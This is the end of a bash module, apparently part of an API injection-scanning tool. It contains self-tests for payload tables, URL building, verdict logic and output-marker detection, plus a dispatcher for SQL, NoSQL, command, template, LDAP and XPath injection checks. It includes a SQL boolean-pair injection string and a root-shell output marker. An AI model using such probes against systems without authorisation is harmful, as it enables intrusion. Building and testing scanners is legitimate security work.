# ── Selftest ─────────────────────────────────────────────────────
ij_selftest() {
    cs_selftest_reset

    local n; n="$(ij_payloads | wc -l | tr -d ' ')"
    chk pay-many     "$( (( n >= 28 )) && echo many || echo few )" "many"
    chk pay-5col     "$(ij_payloads | awk -F'\t' 'NF!=5{c++} END{print c+0}')" "0"
    chk pay-unique   "$(ij_payloads | cut -f2 | sort -u | wc -l | tr -d ' ')" "$n"
    chk pay-fam6     "$(ij_payloads | cut -f1 | sort -u | wc -l | tr -d ' ')" "6"
    chk pay-kinds    "$(ij_payloads | awk -F'\t' '$4 !~ /^(error|boolean-pair|time|output)$/{c++} END{print c+0}')" "0"

    chk fam-6        "$(ij_families | wc -l | tr -d ' ')" "6"
    chk fam-3col     "$(ij_families | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk param-13     "$(ij_params | wc -l | tr -d ' ')" "13"
    chk param-3col   "$(ij_params | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"

    # url building
    chk b-query      "$(cs_split "$(ij_build_split 'https://h/p' 'id' 'x' query)" a _ _ _ ; printf '%s' "$a")" "https://h/p?id=x"
    chk b-query2     "$(cs_split "$(ij_build_split 'https://h/p?a=1' 'id' 'x' query)" a _ _ _ ; printf '%s' "$a")" "https://h/p?a=1&id=x"
    chk b-path       "$(cs_split "$(ij_build_split 'https://h/p/{id}' 'id' 'x' path)" a _ _ _ ; printf '%s' "$a")" "https://h/p/x"
    chk b-path-noid  "$(cs_split "$(ij_build_split 'https://h/p' 'id' 'x' path)" a _ _ _ ; printf '%s' "$a")" "https://h/p/x"
    chk b-json       "$(cs_split "$(ij_build_split 'https://h/p' 'id' 'x' body-json)" _ _ b _ ; printf '%s' "$b")" '{"id":"x"}'
    chk b-json-ctype "$(cs_split "$(ij_build_split 'https://h/p' 'id' 'x' body-json)" _ _ _ d ; printf '%s' "$d")" "application/json"
    chk b-method     "$(cs_split "$(ij_build_split 'https://h/p' 'id' 'x' body-json)" _ m _ _ ; printf '%s' "$m")" "POST"
    chk b-enc        "$(cs_split "$(ij_build_split 'https://h/p' 'id' "a b" query)" a _ _ _ ; printf '%s' "$a")" "https://h/p?id=a%20b"

    # equality of equal-length payloads is what makes the boolean pair usable
    chk b-pair-len   "$(printf '%s' "' AND '1'='1" | wc -c)" "$(printf '%s' "' AND '1'='2" | wc -c)"

    # verdict table
    chk v-unreach    "$(ij_verdict 200 aa 0 000 '' 0 0 error)" "unreachable"
    chk v-absent     "$(ij_verdict 200 aa 0 404 '' 0 0 error)" "absent"
    chk v-nomethod   "$(ij_verdict 200 aa 0 405 '' 0 0 error)" "no-method"
    chk v-clean-err  "$(ij_verdict 200 aa 1 500 bb 1 0 error)" "app-errors-on-clean"
    chk v-err-hit    "$(ij_verdict 200 aa 0 500 'S' 1 0 error)" "error-on-payload"
    chk v-no-delta   "$(ij_verdict 200 aa 0 500 aa 0 0 error)" "no-error"
    chk v-out-hit    "$(ij_verdict 200 aa 0 200 bb 0 1 output)" "output"
    chk v-out-same   "$(ij_verdict 200 aa 0 200 aa 0 0 output)" "no-delta"
    chk v-out-diff   "$(ij_verdict 200 aa 0 200 bb 0 0 output)" "differs-no-output"
    chk v-timed      "$(ij_verdict 200 aa 0 200 bb 0 0 time)" "needs-timed-run"
    chk v-pair       "$(ij_verdict 200 aa 0 200 bb 0 0 boolean-pair)" "needs-pair"

    # pair verdict
    chk p-differ     "$(ij_pair_verdict 200 aa 200 bb cc)" "pair-differs"
    chk p-same       "$(ij_pair_verdict 200 aa 200 aa cc)" "same-response"
    chk p-true-clean "$(ij_pair_verdict 200 aa 200 cc cc)" "true-arm-clean"
    chk p-false-clean "$(ij_pair_verdict 200 cc 200 bb cc)" "false-arm-clean"
    chk p-unreach    "$(ij_pair_verdict 000 aa 200 bb cc)" "unreachable"

    # time verdict: 5s against 0.2s is a delta, 2.4 against 2.2 is not
    chk t-delta      "$(ij_time_verdict 0.2 5.2)" "time-delta"
    chk t-noise      "$(ij_time_verdict 2.2 2.4)" "within-noise"
    chk t-zero       "$(ij_time_verdict 0 0)" "no-timing"
    chk t-faster     "$(ij_time_verdict 5 0.2)" "faster"

    # marker detection on real files
    local f; f="$(mktemp "$CS_SCRATCH/ij-mark.XXXXXX")" 2>/dev/null || f="$OUT_DIR/.mk.$$"
    printf 'You have an error in your SQL syntax near id\n' > "$f"
    chk mk-sql       "$(ij_error_seen "$f")" "1"
    printf 'the value 49 was accepted\n' > "$f"
    chk mk-arith     "$(ij_arith_seen "$f")" "1"
    printf 'the value 4900 was accepted\n' > "$f"
    chk mk-arith-no  "$(ij_arith_seen "$f")" "0"
    printf 'hello cloudsting_inject here\n' > "$f"
    chk mk-out       "$(ij_output_seen "$f" cloudsting_inject)" "1"
    printf 'uid=0(root) gid=0(root)\n' > "$f"
    chk mk-shell     "$(ij_output_seen "$f" nope)" "1"
    printf 'everything is fine\n' > "$f"
    chk mk-clean     "$(ij_error_seen "$f")" "0"
    chk mk-clean-out "$(ij_output_seen "$f" nope)" "0"
    chk mk-nofile    "$(ij_error_seen "$f.none")" "0"
    rm -f "$f"

    # payload count per family is not zero and every family has an error or an
    # output or a pair — nothing may be table-only
    local fams_proven=0 fam
    while IFS=$'\t' read -r fam _; do
        [[ -z "$fam" ]] && continue
        if ij_payloads | awk -F'\t' -v f="$fam" '$1==f && $4!=""{c++} END{exit !(c>0)}'; then
            fams_proven=$((fams_proven + 1))
        fi
    done < <(ij_families)
    chk fam-proven   "$fams_proven" "6"

    # a dead host must not read as a finding
    local out; out="$(ij_cmd_check http://127.0.0.1:9 id query sqli 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"
    chk dead-rc      "$(ij_cmd_check http://127.0.0.1:9 id query sqli >/dev/null 2>&1; echo $?)" "3"

    # usage errors, not crashes
    ij_cmd_check 2>/dev/null;  chk chk-usage  "$?" "2"
    ij_cmd_sqli 2>/dev/null;   chk sqli-usage "$?" "2"
    ij_cmd_nosqli 2>/dev/null; chk nos-usage  "$?" "2"
    ij_cmd_cmdi 2>/dev/null;   chk cmd-usage  "$?" "2"
    ij_cmd_ssti 2>/dev/null;   chk ssti-usage "$?" "2"
    ij_cmd_ldap 2>/dev/null;   chk ldap-usage "$?" "2"
    ij_cmd_xpath 2>/dev/null;  chk xpth-usage "$?" "2"

    # shape contracts
    chk status-fields "$(ij_cmd_status_tsv | awk -F'\t' '{print NF}')" "7"
    chk status-module "$(ij_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(ij_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(ij_cmd_help | head -1 | grep -ci 'API Injection')" "1"
    chk list-rows     "$(ij_cmd_list | grep -c '^FAMILY')" "6"
    chk paylist-rows  "$(ij_cmd_payloads | grep -c '^PAYLOAD')" "$n"
    chk paylist-fam   "$(ij_cmd_payloads sqli | awk -F'\t' '$1=="PAYLOAD" && $2=="sqli"' | wc -l | tr -d ' ')" "$(ij_payloads | awk -F'\t' '$1=="sqli"' | wc -l | tr -d ' ')"
    chk params-rows   "$(ij_cmd_params | grep -c '^PARAM')" "13"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --check)    shift; ij_cmd_check "$@";;
    --sqli)     shift; ij_cmd_sqli "$@";;
    --nosqli)   shift; ij_cmd_nosqli "$@";;
    --cmdi)     shift; ij_cmd_cmdi "$@";;
    --ssti)     shift; ij_cmd_ssti "$@";;
    --ldap)     shift; ij_cmd_ldap "$@";;
    --xpath)    shift; ij_cmd_xpath "$@";;
    --payloads) shift; ij_cmd_payloads "$@";;
    --params)   ij_cmd_params;;
    --families) ij_cmd_families;;
    --list)     ij_cmd_list;;
    --status-tsv|--status) ij_cmd_status_tsv;;
    --menu)     ij_cmd_menu;;
    --selftest) ij_selftest;;
    *)          ij_cmd_help;;
esac
